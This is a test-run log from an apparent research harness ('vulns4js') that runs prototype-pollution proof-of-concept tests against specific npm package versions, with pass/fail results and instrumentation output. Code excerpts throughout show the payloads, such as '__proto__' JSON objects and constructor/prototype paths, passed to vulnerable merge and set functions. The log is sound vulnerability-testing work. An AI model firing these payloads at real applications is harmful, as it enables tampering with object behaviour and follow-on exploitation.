subprocess.CalledProcessError: Command '['npx', 'jest', 'jointjs_3.4.0/jointjs.test.js']' returned non-zero exit status 1.
['../prototype-pollution/firebase-util_0.3.3-canary.c47ba31d0/firebase-util.test.js']
PASS firebase-util_0.3.3-canary.c47ba31d0/firebase-util.test.js
  ✓ prototype pollution in @firebase/util (359 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        1.382 s
Ran all test suites matching /firebase-util_0.3.3-canary.c47ba31d0\/firebase-util.test.js/i.
b"Loaded babel plugin\n  console.log\n    [\n      'CONSTANTS',\n      'Deferred',\n      'ErrorFactory',\n      'FirebaseError',\n      'MAX_VALUE_MILLIS',\n      'RANDOM_FACTOR',\n      'Sha1',\n      'areCookiesEnabled',\n      'assert',\n      'assertionError',\n      'async',\n      'base64',\n      'base64Decode',\n      'base64Encode',\n      'calculateBackoffMillis',\n      'contains',\n      'createSubscribe',\n      'decode',\n      'deepCopy',\n      'deepExtend',\n      'errorPrefix',\n      'getUA',\n      'isAdmin',\n      'isBrowser',\n      'isBrowserExtension',\n      'isElectron',\n      'isEmpty',\n      'isIE',\n      'isIndexedDBAvailable',\n      'isMobileCordova',\n      'isNode',\n      'isNodeSdk',\n      'isReactNative',\n      'isSafari',\n      'isUWP',\n      'isValidFormat',\n      'isValidTimestamp',\n      'issuedAtTime',\n      'jsonEval',\n      'map',\n      'ordinal',\n      'querystring',\n      'querystringDecode',\n      'safeGet',\n      'stringLength',\n      'stringToByteArray',\n      'stringify',\n      'validateArgCount',\n      'validateCallback',\n      'validateContextObject',\n      'validateIndexedDBOpenable',\n      'validateNamespace'\n    ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(1) { 'deepExtend' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 0, 3\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
['../prototype-pollution/minimist_1.0.0/minimist.test.js']
PASS minimist_1.0.0/minimist.test.js
  ✓ prototype pollution in minimist (94 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        1.139 s
Ran all test suites matching /minimist_1.0.0\/minimist.test.js/i.
b"Loaded babel plugin\n  console.log\n    [ 'main' ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(1) { 'main' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 9, 4\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
['../prototype-pollution/js-extend_0.0.1/js-extend.test.js']
FAIL js-extend_0.0.1/js-extend.test.js
  ✕ prototype pollution in js-extend (40 ms)

  ● prototype pollution in js-extend

    TypeError: Cannot set properties of undefined (setting 'extend')

      26 |         if (fs.existsSync(prefixed))
      27 |             currMod = prefixed;
    > 28 |         let result = jest.requireActual(currMod);
         |                           ^
      29 |         global.accessedProperties = new Set();
      30 |         global.declaredProperties = Object.keys(result);    
      31 |         

      at call (node_modules/js-extend/extend.js:26:3)
      at Object.<anonymous> (node_modules/js-extend/extend.js:28:4)
      at Object.<anonymous> (require-interception.js:28:27)

  ● prototype pollution in js-extend

    TypeError: jsExtend.extend is not a function

       5 |   const jsExtend = require("js-extend");
       6 |   const malicious_payload = '{"__proto__":{"polluted":"yes"}}';
    >  7 |   jsExtend.extend({}, JSON.parse(malicious_payload));
         |            ^
       8 | 
       9 |   expect({}.polluted).toBe("yes");
      10 | });

      at Object.<anonymous> (js-extend_0.0.1/js-extend.test.js:7:12)

  ● prototype pollution in js-extend

    TypeError: Cannot read properties of undefined (reading 'size')

      46 |    console.log(global.accessedProperties);   
      47 |    let maxChain = getMaxLength(global.fctsLog) - 1;
    > 48 |    let percUsed = Math.floor(global.accessedProperties.size /global.declaredProperties.length * 10);
         |                                                        ^
      49 |    if (global.accessedProperties.size === 0) percUsed = -1;
      50 |    if (maxChain >= 10) maxChain = 9;
      51 |    if (percUsed === 10) percUsed = 9;

      at Object.<anonymous> (require-interception.js:48:56)

Test Suites: 1 failed, 1 total
Tests:       1 failed, 1 total
Snapshots:   0 total
Time:        1.082 s
Ran all test suites matching /js-extend_0.0.1\/js-extend.test.js/i.
Traceback (most recent call last):
  File "/Users/masudulhasanmasudbhuiyan/Music/vulns4js/prototype-pollution/test_modules_in_serial.py", line 24, in <module>
    ping = subprocess.run(['npx','jest', test_file_name], stdout=subprocess.PIPE, check=True)
  File "/usr/local/Cellar/python@3.9/3.9.8/Frameworks/Python.framework/Versions/3.9/lib/python3.9/subprocess.py", line 528, in run
    raise CalledProcessError(retcode, process.args,
subprocess.CalledProcessError: Command '['npx', 'jest', 'js-extend_0.0.1/js-extend.test.js']' returned non-zero exit status 1.
['../prototype-pollution/cached-path-relative_1.0.1/cached-path-relative.test.js']
PASS cached-path-relative_1.0.1/cached-path-relative.test.js
  ✓ prototype pollution in cached-path-relative (38 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        1.064 s
Ran all test suites matching /cached-path-relative_1.0.1\/cached-path-relative.test.js/i.
b"Loaded babel plugin\n  console.log\n    [ 'main' ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(1) { 'main' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 9, 1\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
['../prototype-pollution/ts-dot-prop_1.4.0/ts-dot-prop.test.js']
PASS ts-dot-prop_1.4.0/ts-dot-prop.test.js
  ✓ prototype pollution in ts-dot-prop (165 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        1.186 s
Ran all test suites matching /ts-dot-prop_1.4.0\/ts-dot-prop.test.js/i.
b"Loaded babel plugin\n  console.log\n    [ 'get', 'set', 'has', 'remove', 'paths' ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(1) { 'set' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 2, 2\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
['../prototype-pollution/lyngs-merge_1.0.9/lyngs-merge.test.js']
FAIL lyngs-merge_1.0.9/lyngs-merge.test.js
  ✕ prototype pollution in @lyngs/merge (464 ms)

  ● prototype pollution in @lyngs/merge

    TypeError: pushFct(...) is not a function

      26 |         if (fs.existsSync(prefixed))
      27 |             currMod = prefixed;
    > 28 |         let result = jest.requireActual(currMod);
         |                           ^
      29 |         global.accessedProperties = new Set();
      30 |         global.declaredProperties = Object.keys(result);    
      31 |         

      at fn (node_modules/@lyngs/merge/dist/index.js:225:2)
      at createCommonjsModule (node_modules/@lyngs/merge/dist/index.js:16:6)
      at factory (node_modules/@lyngs/merge/dist/index.js:224:15)
      at node_modules/@lyngs/merge/dist/index.js:2:65
      at Object.<anonymous> (node_modules/@lyngs/merge/dist/index.js:1:2)
      at Object.<anonymous> (require-interception.js:28:27)

  ● prototype pollution in @lyngs/merge

    TypeError: merge is not a function

      3 |   const { merge } = require("@lyngs/merge");
      4 |   expect({}.polluted).toBe(undefined);
    > 5 |   merge({ dummy: 1 }, JSON.parse(`{"__proto__":{"polluted":"yes"}}`));
        |   ^
      6 |   expect({}.polluted).toBe("yes");
      7 | });
      8 | 

      at Object.<anonymous> (lyngs-merge_1.0.9/lyngs-merge.test.js:5:3)

  ● prototype pollution in @lyngs/merge

    TypeError: Cannot read properties of undefined (reading 'size')

      46 |    console.log(global.accessedProperties);   
      47 |    let maxChain = getMaxLength(global.fctsLog) - 1;
    > 48 |    let percUsed = Math.floor(global.accessedProperties.size /global.declaredProperties.length * 10);
         |                                                        ^
      49 |    if (global.accessedProperties.size === 0) percUsed = -1;
      50 |    if (maxChain >= 10) maxChain = 9;
      51 |    if (percUsed === 10) percUsed = 9;

      at Object.<anonymous> (require-interception.js:48:56)

Test Suites: 1 failed, 1 total
Tests:       1 failed, 1 total
Snapshots:   0 total
Time:        1.503 s
Ran all test suites matching /lyngs-merge_1.0.9\/lyngs-merge.test.js/i.
Traceback (most recent call last):
  File "/Users/masudulhasanmasudbhuiyan/Music/vulns4js/prototype-pollution/test_modules_in_serial.py", line 24, in <module>
    ping = subprocess.run(['npx','jest', test_file_name], stdout=subprocess.PIPE, check=True)
  File "/usr/local/Cellar/python@3.9/3.9.8/Frameworks/Python.framework/Versions/3.9/lib/python3.9/subprocess.py", line 528, in run
    raise CalledProcessError(retcode, process.args,
subprocess.CalledProcessError: Command '['npx', 'jest', 'lyngs-merge_1.0.9/lyngs-merge.test.js']' returned non-zero exit status 1.
['../prototype-pollution/nconf-toml_0.0.1/nconf-toml.test.js']
PASS nconf-toml_0.0.1/nconf-toml.test.js
  ✓ prototype pollution in nconf-toml (517 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        1.567 s
Ran all test suites matching /nconf-toml_0.0.1\/nconf-toml.test.js/i.
b"Loaded babel plugin\n  console.log\n    [ 'stringify', 'parse' ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(1) { 'parse' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 5, 9\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
['../prototype-pollution/utils-extend_1.0.8/utils-extend.test.js']
FAIL utils-extend_1.0.8/utils-extend.test.js
  ✕ prototype pollution in utils-extend (84 ms)

  ● prototype pollution in utils-extend

    ReferenceError: obj is not defined

      4 |   const { extend } = require("utils-extend");
      5 |   const payload = '{"__proto__":{"polluted":"yes"}}';
    > 6 |   obj = {};
        |      ^
      7 | 
      8 |   expect({}.polluted).toBe(undefined);
      9 | 

      at Object.<anonymous> (utils-extend_1.0.8/utils-extend.test.js:6:6)

Test Suites: 1 failed, 1 total
Tests:       1 failed, 1 total
Snapshots:   0 total
Time:        1.172 s
Ran all test suites matching /utils-extend_1.0.8\/utils-extend.test.js/i.
Traceback (most recent call last):
  File "/Users/masudulhasanmasudbhuiyan/Music/vulns4js/prototype-pollution/test_modules_in_serial.py", line 24, in <module>
    ping = subprocess.run(['npx','jest', test_file_name], stdout=subprocess.PIPE, check=True)
  File "/usr/local/Cellar/python@3.9/3.9.8/Frameworks/Python.framework/Versions/3.9/lib/python3.9/subprocess.py", line 528, in run
    raise CalledProcessError(retcode, process.args,
subprocess.CalledProcessError: Command '['npx', 'jest', 'utils-extend_1.0.8/utils-extend.test.js']' returned non-zero exit status 1.
['../prototype-pollution/predefine_0.1.2/predefine.test.js']
PASS predefine_0.1.2/predefine.test.js
  ✓ prototype pollution in predefine (108 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        1.14 s
Ran all test suites matching /predefine_0.1.2\/predefine.test.js/i.
b"Loaded babel plugin\n  console.log\n    [\n      'extend',   'descriptor',\n      'create',   'remove',\n      'merge',    'mixin',\n      'each',     'lazy',\n      'WRITABLE', 'READABLE',\n      'main'\n    ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(2) { 'main', 'merge' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 1, 6\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
['../prototype-pollution/libnested_1.5.0/libnested.test.js']
PASS libnested_1.5.0/libnested.test.js
  ✓ prototype pollution in libnested (77 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        1.092 s
Ran all test suites matching /libnested_1.5.0\/libnested.test.js/i.
b"Loaded babel plugin\n  console.log\n    [\n      'get',   'set',\n      'each',  'map',\n      'paths', 'clone',\n      'copy'\n    ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(1) { 'set' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 1, 2\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
['../prototype-pollution/101_1.0.0/101.test.js']
FAIL 101_1.0.0/101.test.js
  ✕ prototype pollution in 101/set (173 ms)

  ● prototype pollution in 101/set

    you should require a method of 101, just like require("101/<util>")

      26 |         if (fs.existsSync(prefixed))
      27 |             currMod = prefixed;
    > 28 |         let result = jest.requireActual(currMod);
         |                           ^
      29 |         global.accessedProperties = new Set();
      30 |         global.declaredProperties = Object.keys(result);    
      31 |         

      at Object.<anonymous> (node_modules/101/index.js:1:7)
      at Object.<anonymous> (require-interception.js:28:27)

  ● prototype pollution in 101/set

    TypeError: Cannot read properties of undefined (reading 'size')

      46 |    console.log(global.accessedProperties);   
      47 |    let maxChain = getMaxLength(global.fctsLog) - 1;
    > 48 |    let percUsed = Math.floor(global.accessedProperties.size /global.declaredProperties.length * 10);
         |                                                        ^
      49 |    if (global.accessedProperties.size === 0) percUsed = -1;
      50 |    if (maxChain >= 10) maxChain = 9;
      51 |    if (percUsed === 10) percUsed = 9;

      at Object.<anonymous> (require-interception.js:48:56)

Test Suites: 1 failed, 1 total
Tests:       1 failed, 1 total
Snapshots:   0 total
Time:        1.191 s
Ran all test suites matching /101_1.0.0\/101.test.js/i.
Traceback (most recent call last):
  File "/Users/masudulhasanmasudbhuiyan/Music/vulns4js/prototype-pollution/test_modules_in_serial.py", line 24, in <module>
    ping = subprocess.run(['npx','jest', test_file_name], stdout=subprocess.PIPE, check=True)
  File "/usr/local/Cellar/python@3.9/3.9.8/Frameworks/Python.framework/Versions/3.9/lib/python3.9/subprocess.py", line 528, in run
    raise CalledProcessError(retcode, process.args,
subprocess.CalledProcessError: Command '['npx', 'jest', '101_1.0.0/101.test.js']' returned non-zero exit status 1.
['../prototype-pollution/utilitify_1.0.2/utilitify.test.js']
FAIL utilitify_1.0.2/utilitify.test.js
  ✕ prototype pollution in utilitify (102 ms)

  ● prototype pollution in utilitify

    TypeError: /Users/masudulhasanmasudbhuiyan/Music/vulns4js/prototype-pollution/node_modules/utilitify/utils/cloneDeep.js: Cannot read properties of undefined (reading 'unshift')

      71 |           if (path.node.id) name = path.node.id.name;
      72 |           // console.log(path.node.body);
    > 73 |           path.node.body.body.unshift(
         |                               ^
      74 |             t.callExpression(t.identifier("pushFct"), [
      75 |               t.stringLiteral(name + ":" + path.node.loc.start.line),
      76 |             ])

      at PluginPass.enter (babel-instrumentor.js:73:31)
      at newFn (../node_modules/@babel/traverse/lib/visitors.js:177:21)
      at NodePath._call (../node_modules/@babel/traverse/lib/path/context.js:53:20)
      at NodePath.call (../node_modules/@babel/traverse/lib/path/context.js:40:17)
      at NodePath.visit (../node_modules/@babel/traverse/lib/path/context.js:100:31)
      at TraversalContext.visitQueue (../node_modules/@babel/traverse/lib/context.js:103:16)
      at TraversalContext.visitMultiple (../node_modules/@babel/traverse/lib/context.js:72:17)
      at TraversalContext.visit (../node_modules/@babel/traverse/lib/context.js:129:19)
      at traverseNode (../node_modules/@babel/traverse/lib/traverse-node.js:24:17)
      at NodePath.visit (../node_modules/@babel/traverse/lib/path/context.js:107:52)

  ● prototype pollution in utilitify

    TypeError: mergeDeep is not a function

       6 |   expect({}.polluted).toBe(undefined);
       7 | 
    >  8 |   var result = mergeDeep(
         |                ^
       9 |     { a: { b: { c: "c", d: "d" } } },
      10 |     { a: { b: JSON.parse(malicious_payload) } }
      11 |   );

      at Object.<anonymous> (utilitify_1.0.2/utilitify.test.js:8:16)

  ● prototype pollution in utilitify

    TypeError: Cannot read properties of undefined (reading 'size')

      46 |    console.log(global.accessedProperties);   
      47 |    let maxChain = getMaxLength(global.fctsLog) - 1;
    > 48 |    let percUsed = Math.floor(global.accessedProperties.size /global.declaredProperties.length * 10);
         |                                                        ^
      49 |    if (global.accessedProperties.size === 0) percUsed = -1;
      50 |    if (maxChain >= 10) maxChain = 9;
      51 |    if (percUsed === 10) percUsed = 9;

      at Object.<anonymous> (require-interception.js:48:56)

Test Suites: 1 failed, 1 total
Tests:       1 failed, 1 total
Snapshots:   0 total
Time:        1.139 s
Ran all test suites matching /utilitify_1.0.2\/utilitify.test.js/i.
Traceback (most recent call last):
  File "/Users/masudulhasanmasudbhuiyan/Music/vulns4js/prototype-pollution/test_modules_in_serial.py", line 24, in <module>
    ping = subprocess.run(['npx','jest', test_file_name], stdout=subprocess.PIPE, check=True)
  File "/usr/local/Cellar/python@3.9/3.9.8/Frameworks/Python.framework/Versions/3.9/lib/python3.9/subprocess.py", line 528, in run
    raise CalledProcessError(retcode, process.args,
subprocess.CalledProcessError: Command '['npx', 'jest', 'utilitify_1.0.2/utilitify.test.js']' returned non-zero exit status 1.
['../prototype-pollution/gedi_1.6.3/gedi.test.js']
FAIL gedi_1.6.3/gedi.test.js
  ✕ prototype pollution in gedi (475 ms)

  ● prototype pollution in gedi

    ReferenceError: Gel is not defined

      26 |         if (fs.existsSync(prefixed))
      27 |             currMod = prefixed;
    > 28 |         let result = jest.requireActual(currMod);
         |                           ^
      29 |         global.accessedProperties = new Set();
      30 |         global.declaredProperties = Object.keys(result);    
      31 |         

      at Object.<anonymous> (node_modules/gel-js/gel.js:1532:4)
      at Object.<anonymous> (node_modules/gedi/gedi.js:9:11)
      at Object.<anonymous> (require-interception.js:28:27)

  ● prototype pollution in gedi

    TypeError: gedi is not a function

      4 | 
      5 |   const gedi = require("gedi");
    > 6 |   gedi().set("[__proto__/polluted]", "yes");
        |   ^
      7 | 
      8 |   expect({}.polluted).toBe("yes");
      9 | });

      at Object.<anonymous> (gedi_1.6.3/gedi.test.js:6:3)

  ● prototype pollution in gedi

    TypeError: Cannot read properties of undefined (reading 'size')

      46 |    console.log(global.accessedProperties);   
      47 |    let maxChain = getMaxLength(global.fctsLog) - 1;
    > 48 |    let percUsed = Math.floor(global.accessedProperties.size /global.declaredProperties.length * 10);
         |                                                        ^
      49 |    if (global.accessedProperties.size === 0) percUsed = -1;
      50 |    if (maxChain >= 10) maxChain = 9;
      51 |    if (percUsed === 10) percUsed = 9;

      at Object.<anonymous> (require-interception.js:48:56)

Test Suites: 1 failed, 1 total
Tests:       1 failed, 1 total
Snapshots:   0 total
Time:        1.493 s
Ran all test suites matching /gedi_1.6.3\/gedi.test.js/i.
Traceback (most recent call last):
  File "/Users/masudulhasanmasudbhuiyan/Music/vulns4js/prototype-pollution/test_modules_in_serial.py", line 24, in <module>
    ping = subprocess.run(['npx','jest', test_file_name], stdout=subprocess.PIPE, check=True)
  File "/usr/local/Cellar/python@3.9/3.9.8/Frameworks/Python.framework/Versions/3.9/lib/python3.9/subprocess.py", line 528, in run
    raise CalledProcessError(retcode, process.args,
subprocess.CalledProcessError: Command '['npx', 'jest', 'gedi_1.6.3/gedi.test.js']' returned non-zero exit status 1.
['../prototype-pollution/tiny-conf_1.1.0/tiny-conf.test.js']
FAIL tiny-conf_1.1.0/tiny-conf.test.js
  ✕ prototype pollution in tinyConf (66 ms)

  ● prototype pollution in tinyConf

    ReferenceError: obj is not defined

      2 | test("prototype pollution in tinyConf", () => {
      3 |   const tinyConf = require("tiny-conf");
    > 4 |   obj = {};
        |      ^
      5 | 
      6 |   expect({}.polluted).toBe(undefined);
      7 | 

      at Object.<anonymous> (tiny-conf_1.1.0/tiny-conf.test.js:4:6)

Test Suites: 1 failed, 1 total
Tests:       1 failed, 1 total
Snapshots:   0 total
Time:        1.077 s
Ran all test suites matching /tiny-conf_1.1.0\/tiny-conf.test.js/i.
Traceback (most recent call last):
  File "/Users/masudulhasanmasudbhuiyan/Music/vulns4js/prototype-pollution/test_modules_in_serial.py", line 24, in <module>
    ping = subprocess.run(['npx','jest', test_file_name], stdout=subprocess.PIPE, check=True)
  File "/usr/local/Cellar/python@3.9/3.9.8/Frameworks/Python.framework/Versions/3.9/lib/python3.9/subprocess.py", line 528, in run
    raise CalledProcessError(retcode, process.args,
subprocess.CalledProcessError: Command '['npx', 'jest', 'tiny-conf_1.1.0/tiny-conf.test.js']' returned non-zero exit status 1.
['../prototype-pollution/sahmat_1.0.0/sahmat.test.js']
FAIL sahmat_1.0.0/sahmat.test.js
  ✕ prototype pollution in sahmat (36 ms)

  ● prototype pollution in sahmat

    ReferenceError: item is not defined

       6 |   expect({}.polluted).toBe(undefined);
       7 | 
    >  8 |   sahmat(obj, "tmp", (obj.__proto__.polluted = "yes"));
         |   ^
       9 | 
      10 |   expect(obj.tmp.polluted).toBe("yes");
      11 | });

      at sahmat (node_modules/sahmat/index.js:6:15)
      at Object.<anonymous> (sahmat_1.0.0/sahmat.test.js:8:3)

Test Suites: 1 failed, 1 total
Tests:       1 failed, 1 total
Snapshots:   0 total
Time:        1.062 s
Ran all test suites matching /sahmat_1.0.0\/sahmat.test.js/i.
Traceback (most recent call last):
  File "/Users/masudulhasanmasudbhuiyan/Music/vulns4js/prototype-pollution/test_modules_in_serial.py", line 24, in <module>
    ping = subprocess.run(['npx','jest', test_file_name], stdout=subprocess.PIPE, check=True)
  File "/usr/local/Cellar/python@3.9/3.9.8/Frameworks/Python.framework/Versions/3.9/lib/python3.9/subprocess.py", line 528, in run
    raise CalledProcessError(retcode, process.args,
subprocess.CalledProcessError: Command '['npx', 'jest', 'sahmat_1.0.0/sahmat.test.js']' returned non-zero exit status 1.
['../prototype-pollution/gammautils_0.0.81/gammautils.test.js']
PASS gammautils_0.0.81/gammautils.test.js
  ✓ prototype pollution in gammautils (507 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        1.522 s
Ran all test suites matching /gammautils_0.0.81\/gammautils.test.js/i.
b"Loaded babel plugin\n  console.log\n    [\n      'array',   'console',\n      'crypto',  'controller',\n      'date',    'error',\n      'env',     'timezone',\n      'fs',      'math',\n      'number',  'object',\n      'string',  'http',\n      'boolean', 'recomendation',\n      'url',     'validation',\n      'barcode', 'regExp'\n    ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(1) { 'object' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 0, 7\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
['../prototype-pollution/json-ptr_1.1.0/json-ptr.test.js']
FAIL json-ptr_1.1.0/json-ptr.test.js
  ✕ prototype pollution in json-ptr (215 ms)

  ● prototype pollution in json-ptr

    TypeError: Cannot read properties of undefined (reading 'JsonPointer')

      26 |         if (fs.existsSync(prefixed))
      27 |             currMod = prefixed;
    > 28 |         let result = jest.requireActual(currMod);
         |                           ^
      29 |         global.accessedProperties = new Set();
      30 |         global.declaredProperties = Object.keys(result);    
      31 |         

      at factory (node_modules/json-ptr/index.js:12:32)
      at node_modules/json-ptr/index.js:5:22
      at Object.<anonymous> (node_modules/json-ptr/index.js:1:2)
      at Object.<anonymous> (require-interception.js:28:27)

  ● prototype pollution in json-ptr

    TypeError: Cannot read properties of undefined (reading 'set')

      4 | 
      5 |   const { JsonPointer } = require("json-ptr");
    > 6 |   JsonPointer.set({}, "/constructor/prototype/polluted", "yes", true);
        |               ^
      7 | 
      8 |   expect({}.polluted).toBe("yes");
      9 | });

      at Object.<anonymous> (json-ptr_1.1.0/json-ptr.test.js:6:15)

  ● prototype pollution in json-ptr

    TypeError: Cannot read properties of undefined (reading 'size')

      46 |    console.log(global.accessedProperties);   
      47 |    let maxChain = getMaxLength(global.fctsLog) - 1;
    > 48 |    let percUsed = Math.floor(global.accessedProperties.size /global.declaredProperties.length * 10);
         |                                                        ^
      49 |    if (global.accessedProperties.size === 0) percUsed = -1;
      50 |    if (maxChain >= 10) maxChain = 9;
      51 |    if (percUsed === 10) percUsed = 9;

      at Object.<anonymous> (require-interception.js:48:56)

Test Suites: 1 failed, 1 total
Tests:       1 failed, 1 total
Snapshots:   0 total
Time:        1.272 s
Ran all test suites matching /json-ptr_1.1.0\/json-ptr.test.js/i.
Traceback (most recent call last):
  File "/Users/masudulhasanmasudbhuiyan/Music/vulns4js/prototype-pollution/test_modules_in_serial.py", line 24, in <module>
    ping = subprocess.run(['npx','jest', test_file_name], stdout=subprocess.PIPE, check=True)
  File "/usr/local/Cellar/python@3.9/3.9.8/Frameworks/Python.framework/Versions/3.9/lib/python3.9/subprocess.py", line 528, in run
    raise CalledProcessError(retcode, process.args,
subprocess.CalledProcessError: Command '['npx', 'jest', 'json-ptr_1.1.0/json-ptr.test.js']' returned non-zero exit status 1.
['../prototype-pollution/object-path_0.11.4/object-path.test.js']
PASS object-path_0.11.4/object-path.test.js
  ✓ prototype pollution in object-path (24 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        1.06 s
Ran all test suites matching /object-path_0.11.4\/object-path.test.js/i.
b"Loaded babel plugin\n  console.log\n    [\n      'has',\n      'ensureExists',\n      'set',\n      'insert',\n      'empty',\n      'push',\n      'coalesce',\n      'get',\n      'del',\n      'create',\n      'withInheritedProps',\n      'main'\n    ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(2) { 'main', 'withInheritedProps' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 1, 3\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
['../prototype-pollution/object-collider_1.0.3/object-collider.test.js']
FAIL object-collider_1.0.3/object-collider.test.js
  ✕ prototype pollution in object-collider (134 ms)

  ● prototype pollution in object-collider

    ReferenceError: obj is not defined

      4 |   var { collide } = require("object-collider");
      5 |   const payload = JSON.parse('{"__proto__":{"polluted":"yes"}}');
    > 6 |   obj = {};
        |      ^
      7 | 
      8 |   expect({}.polluted).toBe(undefined);
      9 | 

      at Object.<anonymous> (object-collider_1.0.3/object-collider.test.js:6:6)

Test Suites: 1 failed, 1 total
Tests:       1 failed, 1 total
Snapshots:   0 total
Time:        1.174 s
Ran all test suites matching /object-collider_1.0.3\/object-collider.test.js/i.
Traceback (most recent call last):
  File "/Users/masudulhasanmasudbhuiyan/Music/vulns4js/prototype-pollution/test_modules_in_serial.py", line 24, in <module>
    ping = subprocess.run(['npx','jest', test_file_name], stdout=subprocess.PIPE, check=True)
  File "/usr/local/Cellar/python@3.9/3.9.8/Frameworks/Python.framework/Versions/3.9/lib/python3.9/subprocess.py", line 528, in run
    raise CalledProcessError(retcode, process.args,
subprocess.CalledProcessError: Command '['npx', 'jest', 'object-collider_1.0.3/object-collider.test.js']' returned non-zero exit status 1.
['../prototype-pollution/phpjs_1.3.2/phpjs.test.js']
FAIL phpjs_1.3.2/phpjs.test.js
  ✕ prototype pollution in phpjs (1229 ms)

  ● prototype pollution in phpjs

    ReferenceError: phpjs is not defined

      26 |         if (fs.existsSync(prefixed))
      27 |             currMod = prefixed;
    > 28 |         let result = jest.requireActual(currMod);
         |                           ^
      29 |         global.accessedProperties = new Set();
      30 |         global.declaredProperties = Object.keys(result);    
      31 |         

      at Object.<anonymous> (node_modules/phpjs/index.js:1:6)
      at Object.<anonymous> (require-interception.js:28:27)

  ● prototype pollution in phpjs

    TypeError: p.parse_str is not a function

       5 | 
       6 |   const p = require("phpjs");
    >  7 |   p.parse_str("__proto__[polluted]=yes", {});
         |     ^
       8 | 
       9 |   expect({}.polluted).toBe("yes");
      10 | });

      at Object.<anonymous> (phpjs_1.3.2/phpjs.test.js:7:5)

  ● prototype pollution in phpjs

    TypeError: Cannot read properties of undefined (reading 'size')

      46 |    console.log(global.accessedProperties);   
      47 |    let maxChain = getMaxLength(global.fctsLog) - 1;
    > 48 |    let percUsed = Math.floor(global.accessedProperties.size /global.declaredProperties.length * 10);
         |                                                        ^
      49 |    if (global.accessedProperties.size === 0) percUsed = -1;
      50 |    if (maxChain >= 10) maxChain = 9;
      51 |    if (percUsed === 10) percUsed = 9;

      at Object.<anonymous> (require-interception.js:48:56)

Test Suites: 1 failed, 1 total
Tests:       1 failed, 1 total
Snapshots:   0 total
Time:        2.319 s
Ran all test suites matching /phpjs_1.3.2\/phpjs.test.js/i.
Traceback (most recent call last):
  File "/Users/masudulhasanmasudbhuiyan/Music/vulns4js/prototype-pollution/test_modules_in_serial.py", line 24, in <module>
    ping = subprocess.run(['npx','jest', test_file_name], stdout=subprocess.PIPE, check=True)
  File "/usr/local/Cellar/python@3.9/3.9.8/Frameworks/Python.framework/Versions/3.9/lib/python3.9/subprocess.py", line 528, in run
    raise CalledProcessError(retcode, process.args,
subprocess.CalledProcessError: Command '['npx', 'jest', 'phpjs_1.3.2/phpjs.test.js']' returned non-zero exit status 1.
['../prototype-pollution/keyget_2.2.0/keyget.test.js']
PASS keyget_2.2.0/keyget.test.js
  ✓ prototype pollution in keyget (84 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        1.142 s
Ran all test suites matching /keyget_2.2.0\/keyget.test.js/i.
b"Loaded babel plugin\n  console.log\n    [\n      'get',         'set',\n      'has',         'push',\n      'method',      'call',\n      'breadcrumbs', 'select',\n      'at',          'structure'\n    ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(1) { 'set' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 1, 3\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
['../prototype-pollution/merge-deep_3.0.0/merge-deep.test.js']
PASS merge-deep_3.0.0/merge-deep.test.js
  ✓ prototype pollution in merge-deep (201 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        1.251 s
Ran all test suites matching /merge-deep_3.0.0\/merge-deep.test.js/i.
